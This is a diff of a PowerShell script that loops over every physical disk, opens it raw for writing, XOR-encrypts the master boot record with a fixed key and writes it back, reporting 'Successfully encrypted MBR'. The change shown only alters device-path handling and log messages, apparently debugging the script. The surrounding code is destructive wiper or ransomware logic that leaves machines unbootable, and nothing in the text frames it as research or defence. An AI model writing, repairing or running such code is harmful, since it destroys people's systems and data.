@@ -12,7 +12,7 @@ $drives = Get-CimInstance -ClassName Win32_DiskDrive
 $key = 0x55
 
 foreach ($drive in $drives) {
-    $diskPath = "\\.\" + $drive.DeviceID
+    $diskPath = $drive.DeviceID
     
     try {
         # Open the disk for reading and writing
@@ -33,10 +33,10 @@ foreach ($drive in $drives) {
         $fs.Seek(0, [IO.SeekOrigin]::Begin) | Out-Null
         $fs.Write($mbr, 0, 512)
 
-        Write-Host "Successfully encrypted MBR on $($drive.DeviceID)"
+        Write-Host "Successfully encrypted MBR on $diskPath"
 
     } catch {
-        throw "Failed to process $($drive.DeviceID) - $_"
+        throw "Failed to process $diskPath - $_"
     } finally {
         # Close the file stream
         if ($fs) { $fs.Dispose() }
